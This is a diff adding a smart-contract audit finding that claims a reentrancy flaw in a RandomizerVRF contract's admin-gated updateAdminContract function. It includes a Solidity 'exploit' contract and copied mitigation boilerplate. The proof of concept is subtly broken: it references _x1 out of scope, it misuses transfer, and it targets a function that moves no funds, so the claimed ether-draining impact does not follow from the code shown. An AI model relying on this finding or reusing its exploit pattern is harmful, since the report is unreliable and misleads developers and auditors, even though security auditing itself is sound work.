@@ -400,3 +400,58 @@ Checks-Effects-Interactions should be applied to the functions.
 Balance updates should be made at the beginning of the call.
 The actual call should be made at the end of the function.
 So that the balance is already updated first and reentrancy is not possible.
+## [L-07] Reentrancy in RandomizerVRF contract
+## Impact
+The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
+Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
+Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
+## Proof of Concept
+**Vulnerable updateAdminContract function to reentrancy**
+```sol
+// Ln 94-97
+    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {
+        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, "Contract is not Admin");
+        adminsContract = INextGenAdmins(_newadminsContract);
+    }
+```
+**Exploit Reentrancy**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.19;
+
+import "./RandomizerVRF.sol";
+
+contract tRandomizerVRF {
+
+   RandomizerVRF public x1;
+
+   constructor(RandomizerVRF _x1) {
+
+      x1 = RandomizerVRF(_x1);
+
+   }
+
+
+   function testRenterS() public payable {
+
+      x1.updateAdminContract(address(_x1));
+
+   }
+
+   receive() external payable {
+
+      msg.sender.transfer(payable(address(_x1)).balance);
+
+   }
+
+   } 
+```
+## Tools Used
+VS Code.
+## Recommended Mitigation Steps
+All functions that are not internal and are making a call should have a reentrancy guard added to them.
+Checks-Effects-Interactions should be applied to the functions. 
+Balance updates should be made at the beginning of the call.
+The actual call should be made at the end of the function.
+So that the balance is already updated first and reentrancy is not possible.
